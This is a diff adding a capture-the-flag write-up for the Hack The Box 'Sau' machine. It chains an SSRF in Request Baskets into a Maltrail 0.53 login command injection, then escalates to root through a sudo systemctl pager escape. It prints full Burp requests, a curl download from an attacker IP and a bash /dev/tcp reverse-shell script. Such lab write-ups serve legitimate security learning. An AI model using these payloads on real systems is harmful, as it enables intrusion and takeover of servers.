@@ -129,9 +129,146 @@ But we can see that port 55555 is open, let's take a look on that.
 
 After opening the url in browser we can see that,
 ![alt text](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/Screenshot%20from%202023-08-20%2010-50-26.png?raw=true)
+The Website is running request basket.
+
+googling the recent vulnerabilities on request basket shows that This is vulnerabke to ***Server Side Request Forgery***
+![exploit-db script](https://www.exploit-db.com/exploits/51675), shows that vulnerable endpoint is "/api/baskets/<any name>"
+
+Let's recreate this exploit manually
+We intercept the request and send it to repeater and then change the request method to post.
+We will create a basket, with some json data and we give a name in /api/baskets/<here>
+We change the Content-Type to application/json
+Lastly, we add json data, here we make the server to hit us
+![burp](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/burp.png?raw=true)
+
+Finally, after we hit the page, https://10.10.14.224:55555/anybasket, we should get a hit
+```bash
+sudo nc -lnvp 80
+```
+![nc](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/nc.png?raw=true)
+
+**We have confirmed that this is indeed vulnerable to SSRF**
+
+#### Initial Access by exploiting command injection on maltrail
+
+After confirming the SSRF we can make webserver to go to it's localhost where a service is running internally. (we saw filtered ports on nmap)
+In BurpSuite, dont forget to change the basket name (here it is anybasket1)
+```bash
+POST /api/baskets/anybasket1 HTTP/1.1
+Host: 10.10.11.224:55555
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/json
+Content-Length: 141
+
+{
+	"forward_url": "http://127.0.0.1",
+	"proxy_response": true,
+	"insecure_tls": false,
+	"expand_path": true,
+	"capacity": 250
+}
+```
+
+When we hit http://10.10.11.224:55555/anybasket1, we get the page of maltrail
+![maltrail](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/maltrail.png?raw=true)
+
+The version of maltrail is 0.53 which is vulnerable to command injection.
+![maltrail exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)
+
+The injectable parameter is in login where username parameter is vulnerable to command injection, 
+In burpsuite, we do this to get code execution using ssrf.
+![command injection](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/command-injection.png?raw=true)
+
+Note: change basket name to anybasket2 in url (otherwise we get basket already exist error)
+We see that after hitting http://10.10.11.224:5555/anybasket2, the server hangs for 10 sec and displays login failed.
+***We have now confirmed command injection***
+Let us get a reverse shell
+
+We create shell.sh script,
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.107/4444 0>&1
+```
+We stand up a http server
+```bash
+sudo python3 -m http.server 80
+```
+In burpsuite change payload to download our script and store in /dev/shm,
+```bash
+POST /api/baskets/anybasket3 HTTP/1.1
+Host: 10.10.11.224:55555
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/json
+Content-Length: 160
+
+{
+	"forward_url": "http://127.0.0.1/login?username=;`curl+http://10.10.14.107/shell.sh+-o+/dev/shm/shell.sh`",
+	"proxy_response": true,
+	"insecure_tls": false,
+	"expand_path": true,
+	"capacity": 250
+}
+```
+when we hit anybasket3, it downloads the file.
+After the server downloads the file we run that file to get shell
+WE stand up a listener to catch a shell
+```bash
+nc -lnvp 4444
+```
+
+In burpsuite,
+![burpshell](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/burpshell.png?raw=true)
+
+when we hit anybasket4 we should get a reverse shell
+![shell](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/reverse-shell.png?raw=true)
+
+we fix our tty,
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+stty raw -echo; fg
+ENTER twice
+
+export TERM=xterm
+```
 
 
+#### Privilege Escalation
+if we run ```sudo -l```
 
+```bash
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+to get root shell, we do
+```bash
+sudo /usr/bin/systemctl status trail.service
+```
+Then we are in less output
+if we press ```!sh```
+we will get a root shell
+![root](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/root.png?raw=true)
+
+That is the box, hope you guys enjoyed.
+ThankYou.
 
 
 
